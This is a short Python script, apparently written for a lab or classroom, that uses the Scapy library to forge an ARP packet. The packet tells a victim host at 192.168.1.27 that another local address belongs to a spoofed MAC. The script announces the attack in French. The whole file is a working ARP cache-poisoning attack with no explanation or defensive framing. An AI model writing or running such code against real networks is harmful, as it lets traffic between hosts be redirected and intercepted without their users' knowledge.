from scapy.all import *

victim_ip = "192.168.1.27" 
victim_mac = "08:00:27:72:6b:4a"  

spoofed_ip = "192.168.1.46"  
spoofed_mac = "de:ad:be:ef:ca:fe"

def arp_poison(victim_ip, victim_mac, spoofed_ip, spoofed_mac):

    arp = ARP(op="who-has", pdst=victim_ip, hwdst=victim_mac, psrc=spoofed_ip, hwsrc=spoofed_mac) 
    print(f"Attaque en cours sur {victim_ip}...")
    send(arp, verbose=False)  

arp_poison(victim_ip, victim_mac, spoofed_ip, spoofed_mac)